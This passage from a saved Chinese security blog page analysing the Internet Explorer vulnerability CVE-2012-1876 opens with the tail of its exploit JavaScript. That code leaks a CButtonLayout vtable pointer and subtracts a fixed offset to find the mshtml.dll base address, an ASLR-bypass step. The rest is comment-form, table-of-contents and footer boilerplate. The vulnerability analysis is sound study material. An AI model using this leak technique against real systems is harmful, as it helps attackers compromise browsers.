            <span class="hljs-keyword">var</span> leak = al[i].substring((<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span> + (<span class="hljs-number">2</span> + <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span> + (<span class="hljs-number">2</span> + <span class="hljs-number">8</span> + <span class="hljs-number">4</span>) / <span class="hljs-number">2</span>);
            leak_addr = <span class="hljs-built_in">parseInt</span>(leak.charCodeAt(<span class="hljs-number">1</span>).toString(<span class="hljs-number">16</span>) + leak.charCodeAt(<span class="hljs-number">0</span>).toString(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>);
            alert(<span class="hljs-string">"CbuttonLayout虚表指针: 0x"</span> + leak_addr.toString(<span class="hljs-number">16</span>));
            <span class="hljs-comment">// 减去固定偏移，得到mshtml.dll基址</span>
            mshtmlbase = leak_addr - <span class="hljs-number">0x173af8</span>;
            alert(<span class="hljs-string">"mshtml.dll基址: 0x"</span> + mshtmlbase.toString(<span class="hljs-number">16</span>));
            <span class="hljs-keyword">break</span>;
        }
    }
}</code></pre>                </div>
            </article>
            <!-- <hr>
            <ul class="pager">
                <li class="previous"><a href="http://#/archives/190.html" title="Detours入门">Detours入门</a></li>
                <li class="next"><a href="http://#/archives/213.html" title="CVE-2020-0787分析">CVE-2020-0787分析</a></li>
            </ul> -->
            <hr>
        </div>

    </div>
    </div>
    

<div id="respond-post-201" class="comment-container">
    <div id="comments" class="clearfix">
                        <div id="respond-post-201" class="respond">
            <div class="cancel-comment-reply">
            <a id="cancel-comment-reply-link" href="http://#/archives/201.html#respond-post-201" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </div>
        
            <h3 id="response">添加新评论</h3>
            <form method="post" action="http://#/archives/201.html/comment" id="comment-form" role="form">
                                <div class="am-g">
                    <span class="am-u-lg-4 comment-input">
                        <label for="author" class="required">称呼</label>
                        <input type="text" name="author" id="author" class="text" value="" required="">
                    </span>
                    <span class="am-u-lg-4">
                        <label for="mail" class="required">Email</label>
                        <input type="email" name="mail" id="mail" class="text" value="" required="">
                    </span>
                    <span class="am-u-lg-4 comment-input">
                        <label for="url">网站</label>
                        <input type="url" name="url" id="url" class="text" value="">
                    </span>
                </div>
                                <p>
                    <label for="textarea" class="required">内容</label>
                    <textarea rows="8" cols="32" name="text" id="textarea" class="textarea" required=""></textarea>
                </p>
                <p>
                    <button type="submit" class="submit am-btn am-btn-primary">提交评论</button>
                </p>
            <input type="hidden" name="_" value="10ba45f755f60fd4ee2dd685a1863eec"></form>
        </div>
        
            </div>
</div>    <div id="directory-content" class="directory-content initial headroom--top headroom--not-bottom">
        <div id="directory"><ul><span style="color: rgb(243, 129, 129); font-weight: 600;">目录</span><li><a href="http://#/archives/201.html#directory059046285320384231">简介</a></li><li><a href="http://#/archives/201.html#directory059046285320384232">PoC分析</a><ul><li><a href="http://#/archives/201.html#directory059046285320384233">分析过程</a></li><li><a href="http://#/archives/201.html#directory059046285320384234">总结</a></li></ul></li><li><a href="http://#/archives/201.html#directory059046285320384235">Exp简要分析</a></li></ul></div>
    </div>
    <!-- content end -->

<footer class="blog-footer">
    <ul class="list-inline text-center">
	    <li>
            <a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
            <span class="am-icon-btn am-icon-md am-icon-github footer-icon"></span>
        </a></li><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
    </a></ul><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
    </a><div class="blog-text-center"><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">© 2021 </a><a href="http://#/">lZeroyuee's Blog</a> 由 <a href="http://www.typecho.org/" target="_blank">Typecho</a> 强力驱动 Theme is <a href="https://spiritree.me/" target="_blank">Amaze made by Spiritree</a>
    </div>
</footer>
<script src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/jquery.slim.min.js.下载"></script>
<script src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/highlight.min.js.下载"></script>
<script>
    var $body=document.body;var $toggle=document.querySelector(".navbar-toggle");var $navbar=document.querySelector("#huxblog_navbar");var $collapse=document.querySelector(".navbar-collapse");var __HuxNav__={close:function(){$navbar.className=" ";setTimeout(function(){if($navbar.className.indexOf("in")<0){$collapse.style.height="0px"}},400)},open:function(){$collapse.style.height="auto";$navbar.className+=" in"}};$toggle.addEventListener("click",function(a){if($navbar.className.indexOf("in")>0){__HuxNav__.close()}else{__HuxNav__.open()}});document.addEventListener("click",function(a){if(a.target==$toggle){return}if(a.target.className=="icon-bar"){return}__HuxNav__.close()});jQuery(document).ready(function(c){var d=1170;if(c(window).width()>d){var b=c(".navbar-custom").height(),a=c(".intro-header .container").height();c(window).on("scroll",{previousTop:0},function(){var e=c(window).scrollTop(),f=c(".side-catalog");if(e<this.previousTop){if(e>0&&c(".navbar-custom").hasClass("is-fixed")){c(".navbar-custom").addClass("is-visible")}else{c(".navbar-custom").removeClass("is-visible is-fixed")}}else{c(".navbar-custom").removeClass("is-visible");if(e>b&&!c(".navbar-custom").hasClass("is-fixed")){c(".navbar-custom").addClass("is-fixed")}}this.previousTop=e;f.show();if(e>(a+41)){f.addClass("fixed")}else{f.removeClass("fixed")}})}});
</script>
<script>
    $(document).ready(function() {
        $('pre code').each(function(i, block) {
            hljs.highlightBlock(block)
        })
        $('table').addClass('am-table')
    })
</script>
<script type="text/javascript" src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/Meting.min.js.下载"></script>

<script src="./CVE-2012-1876分析 - lZeroyuee&#39;s Blog_files/headroom.min.js.下载"></script>
<script>
var postDirectoryBuild=function(){var b=function a(l,h){var k=[],e=typeof h==="object",g=typeof h==="string",j,f,d;for(f=0,d=l.length;f<d;f++){j=l[f];if((j.nodeType===1||j.nodeType===9)&&(!h||e&&h.test(j.tagName.toLowerCase())||g&&j.tagName.toLowerCase()===h)){k.push(j)}}return k},c=function(e,f,r){var n=[],m=[],h,p,d,j,l,s,o,g,k,q;h=(function(i,C,A){var w=b(i.childNodes,/^h\d$/),x=[],v=1,B=1,z=0,D=1,t="directory"+(Math.random()+"").replace(/\D/,""),B,y,u;while(w.length){u=w.shift();C.push(u.innerHTML);y=+u.tagName.match(/\d/)[0];if(y>v){x.push(1);B+=1}else{if(y===B||y>B&&y<=v){x.push(0);B=B}else{if(y<B){x.push(y-B);B=y}}}z+=x[x.length-1];v=y;u.id=u.id||(t+D++);A.push(u.id)}if(z!==0&&x[0]===1){x[0]=0}return x})(e,n,m);j=p=document.createElement("ul");q=document.createElement("span");q.style="color:#F38181;font-weight:600;";q.innerHTML="目录";p.appendChild(q);dirNum=[];for(g=0,k=h.length;g<k;g++){d=h[g];if(d===1){l=document.createElement("ul");if(!j.lastElementChild){j.appendChild(document.createElement("li"))}j.lastElementChild.appendChild(l);j=l;dirNum.push(0)}else{if(d<0){d*=2;while(d++){if(d%2){dirNum.pop()}j=j.parentNode}}}dirNum[dirNum.length-1]++;s=document.createElement("li");o=document.createElement("a");o.href="#"+m[g];o.innerHTML=!r?n[g]:dirNum.join(".")+" "+n[g];s.appendChild(o);j.appendChild(s)}f.appendChild(p)};c(document.getElementById("post-content"),document.getElementById("directory"),false)};postDirectoryBuild();
</script>
<script>
    var postDirectory = new Headroom(document.getElementById("directory-content"), {
    tolerance: 5,
    offset: 240,
    classes: {
        initial: "initial",
        pinned: "pinned",
        unpinned: "unpinned"
    }
});
postDirectory.init();
</script></body></html>